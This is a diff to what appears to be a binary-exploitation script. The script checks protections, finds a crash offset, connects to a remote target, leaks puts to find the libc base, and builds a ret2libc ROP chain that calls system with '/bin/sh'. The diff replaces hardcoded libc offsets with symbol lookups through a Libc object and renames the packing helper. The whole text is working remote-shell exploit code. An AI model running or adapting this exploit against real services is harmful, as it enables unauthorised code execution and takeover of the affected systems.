@@ -14,10 +14,10 @@ print("[+] Binary: " + binary_path)
 # Step 1: Analyze binary protections
 print("\n[*] Step 1: Analyzing binary protections...")
 let protections = checksec(binary_path)
-print("    NX: " + str(protections.nx))
-print("    PIE: " + str(protections.pie))
-print("    RELRO: " + protections.relro)
-print("    Stack Canary: " + str(protections.canary))
+print("    NX: " + str(protections["nx"]))
+print("    PIE: " + str(protections["pie"]))
+print("    RELRO: " + protections["relro"])
+print("    Stack Canary: " + str(protections["canary"]))
 
 # Step 2: Find crash offset using cyclic pattern
 print("\n[*] Step 2: Finding crash offset...")
@@ -34,14 +34,19 @@ print("    [!] Crash offset found: " + str(crash_offset))
 print("\n[*] Step 3: Leaking libc base address...")
 let session = connect(target_host, target_port)
 let puts_addr = leak_address(session, "puts")
-let libc_base = puts_addr - 0x084270  # puts offset in libc
 print("    Leaked puts @ " + hex(puts_addr))
+
+# Calculate libc base dynamically using Libc object
+let libc_template = Libc("ubuntu20.04")
+let puts_offset = libc_template["symbols"]["puts"]
+let libc_base = puts_addr - puts_offset
 print("    Calculated libc base @ " + hex(libc_base))
 
-# Step 4: Build ROP chain
+# Step 4: Build ROP chain with dynamic address resolution
 print("\n[*] Step 4: Building ROP chain...")
-let system_addr = libc_base + 0x04f440
-let binsh_addr = libc_base + 0x1b3e9a
+let libc_resolved = Libc({version: "ubuntu20.04", base: libc_base})
+let system_addr = libc_resolved["symbols"]["system"]
+let binsh_addr = libc_resolved["strings"]["bin_sh"]
 let pop_rdi = libc_base + 0x02164f  # pop rdi; ret
 let ret = libc_base + 0x00001016      # ret (for stack alignment)
 
@@ -63,7 +68,7 @@ let padding = cyclic(crash_offset)
 let payload = padding
 
 for gadget in rop_chain
-    payload = payload + pack64(gadget)
+    payload = payload + p64(gadget)
 end
 
 print("    Payload size: " + str(len(payload)) + " bytes")
